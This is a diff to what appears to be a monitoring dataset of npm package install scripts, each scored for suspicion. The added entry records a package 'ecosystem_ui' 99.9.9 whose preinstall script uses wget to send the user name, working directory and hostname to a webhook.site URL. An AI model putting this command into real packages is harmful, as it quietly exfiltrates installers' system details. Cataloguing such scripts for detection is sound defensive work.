@@ -1,5 +1,15 @@
 [
   {
+    "packageName": "ecosystem_ui",
+    "version": "99.9.9",
+    "scriptType": "preinstall",
+    "scriptContent": "wget --quiet https://webhook.site/6abf7721-5a64-43a3-896c-7b182a3efed5//?user=$(whoami)&path=$(pwd)&hostname=$(hostname)\" ",
+    "previousVersion": "99.9.8",
+    "timestamp": "2026-02-12T20:44:41.075Z",
+    "issuesend": false,
+    "suspicionScore": 10
+  },
+  {
     "packageName": "@canonical/maas-ui",
     "version": "1.1.1",
     "scriptType": "postbuild",
